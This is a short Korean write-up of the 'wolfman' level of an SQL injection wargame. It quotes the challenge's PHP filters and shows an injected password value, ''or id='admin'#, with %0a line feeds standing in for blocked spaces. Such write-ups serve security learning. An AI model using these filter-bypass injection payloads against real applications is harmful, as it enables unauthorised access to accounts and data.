<img width="222" alt="스크린샷 2020-01-16 오후 5 44 51" src="https://user-images.githubusercontent.com/54495632/72508550-317a6000-3889-11ea-8ee0-5e7c33dca96e.png">

5번 wolfman

<img width="650" alt="스크린샷 2020-01-16 오후 5 45 00" src="https://user-images.githubusercontent.com/54495632/72508556-363f1400-3889-11ea-9372-4c3f5275c94a.png">

if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
pw에서 공백이 필터링 되는 문제이다.
공백 우회에는 많은 방법이 있는데 여기서는 Line feed %0a URL을 공백대신 사용했다.

 $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'";  
pw를 get으로 받는 쿼리. id엔 이미 guest가 입력되어 있다.
pw를 false로 만들고 or 과 주석을 이용했다.

if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
if($result['id'] == 'admin') solve("wolfman"); 
id 가 admin인 경우 solve가 된다.

 $query = "select id from prob_wolfman where id='guest' and pw=''or id='admin'# -> injection할 쿼리문 예상.

공백 위치에 %0a를 대신 적어 준다.

<img width="741" alt="스크린샷 2020-01-16 오후 5 53 50" src="https://user-images.githubusercontent.com/54495632/72508755-9cc43200-3889-11ea-99ac-669f74fa7b5c.png">
